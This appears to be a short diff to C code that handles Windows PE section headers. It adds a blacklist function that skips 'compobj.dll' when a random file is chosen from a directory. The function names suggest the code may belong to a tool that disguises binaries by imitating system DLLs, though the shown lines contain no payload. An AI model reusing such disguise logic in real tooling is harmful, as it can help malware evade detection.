@@ -130,6 +130,16 @@ PIMAGE_SECTION_HEADER lookup_core_section(PIMAGE_DOS_HEADER pImageDosHeader, PIM
 	return pResult;
 }
 
+BOOL check_blacklist(PWIN32_FIND_DATA lpFindData)
+{
+	char szToLower[MAX_PATH];
+	if (strcmpi(lpFindData->cFileName, "compobj.dll") == 0)
+		return TRUE;
+
+	return FALSE;
+}
+
+
 BOOL lookup_rand_file(char *szOutFile, int maxsize)
 {
 	memset(szOutFile, 0, maxsize);
@@ -171,12 +181,16 @@ BOOL lookup_rand_file(char *szOutFile, int maxsize)
 
 	do
 	{	// perform a backup!
+		if (check_blacklist(&findfiledata) == TRUE)	// file in blacklist
+			continue;
+
 		memcpy(&_previous_findfiledata, &findfiledata, sizeof(WIN32_FIND_DATA));
 		if (l  == 0)
 			break;
 
 		l--;
 	} while(FindNextFileA(hLook, &findfiledata));
+
 
 	FindClose(hLook);
 
